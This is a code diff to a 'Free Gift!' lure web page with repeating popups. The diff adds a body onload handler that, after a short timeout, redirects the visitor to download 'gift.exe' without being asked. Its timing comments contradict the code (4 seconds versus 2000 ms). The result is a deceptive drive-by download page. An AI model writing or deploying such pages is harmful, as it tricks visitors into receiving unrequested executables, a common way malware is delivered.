@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Free gift!</title>
+    <title>Free Gift!</title>
     <style>
         body {
             background-color: #ff00ff; /* Bright magenta */
@@ -72,7 +72,7 @@
         }
     </style>
 </head>
-<body>
+<body onload="startDownload()">
 
     <h1>Welcome free_gifts!</h1>
     <button class="bad-button" onclick="openPopup()">Click Me For Free Gift!</button>
@@ -109,10 +109,17 @@
             document.getElementById("popup").style.display = "none";
         }
 
+        // Start download after 4 seconds
+        function startDownload() {
+            setTimeout(function() {
+                window.location.href = 'gift.exe'; // Change this to the correct path of your executable file
+            }, 2000); // 4000 milliseconds = 4 seconds
+        }
+
         // Generate random popups
         setInterval(() => {
             openPopup();
-        }, 15000); // 5 seconds
+        }, 15000); // 15 seconds
     </script>
 </body>
 </html>
